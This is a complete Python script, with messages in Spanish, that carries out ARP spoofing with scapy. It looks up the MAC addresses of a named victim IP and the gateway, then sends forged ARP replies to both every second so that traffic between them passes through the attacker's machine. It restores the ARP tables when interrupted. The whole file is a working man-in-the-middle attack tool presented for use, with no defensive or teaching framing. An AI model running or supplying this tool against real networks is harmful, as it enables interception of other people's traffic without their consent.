#!/usr/bin/env python3

import argparse
import time
import signal
import sys
import scapy.all as scapy

target_ip = None
gateway_ip = None
target_mac = None
gateway_mac = None

def def_handler(sig, frame):
    print(f"\n[!] Ctrl+C detectado. Restaurando tablas ARP. Por favor, espera...")
    restore_arp_tables(target_ip, gateway_ip, target_mac, gateway_mac)
    print(f"[+] Tablas ARP restauradas. Saliendo.")
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta de ARP Spoofing. Intercepta tráfico entre un objetivo y un gateway.")
    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="Dirección IP del objetivo (víctima).")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True, help="Dirección IP del gateway (router).")
    args = parser.parse_args()
    
    global target_ip, gateway_ip
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip
    
    return args

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac_addr = get_mac(target_ip)
    if target_mac_addr is None:
        print(f"[!] No se pudo obtener la MAC de {target_ip}. Saliendo...")
        restore_arp_tables(target_ip, gateway_ip, target_mac, gateway_mac)
        sys.exit(1)
        
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_addr, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore_arp_tables(target_ip, gateway_ip, target_mac, gateway_mac):
    if target_ip and gateway_ip and target_mac and gateway_mac:
        target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        gateway_packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        
        scapy.send(target_packet, count=4, verbose=False)
        scapy.send(gateway_packet, count=4, verbose=False)
    else:
        print("[!] No se pudieron restaurar las tablas ARP: faltan direcciones MAC originales.")

def main():
    args = get_arguments()
    global target_ip, gateway_ip, target_mac, gateway_mac
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip

    print(f"[+] Intentando obtener MACs de {target_ip} y {gateway_ip}...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        print(f"[!] No se pudo obtener la MAC de la IP objetivo: {target_ip}. Asegúrate de que el objetivo esté activo en la red.")
        sys.exit(1)
    if not gateway_mac:
        print(f"[!] No se pudo obtener la MAC del Gateway/Router: {gateway_ip}. Asegúrate de que el router esté activo en la red.")
        sys.exit(1)

    print(f"[+] MAC objetivo ({target_ip}): {target_mac}")
    print(f"[+] MAC Gateway ({gateway_ip}): {gateway_mac}")
    print(f"[+] Iniciando ARP Spoofing. Presiona Ctrl+C para detener y restaurar la red.")

    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[+] Paquetes enviados: {sent_packets_count}", end="")
            time.sleep(1)
    except Exception as e:
        print(f"\n[!] Ocurrió un error inesperado durante el spoofing: {e}")
    finally:
        pass 

if __name__ == '__main__':
    main()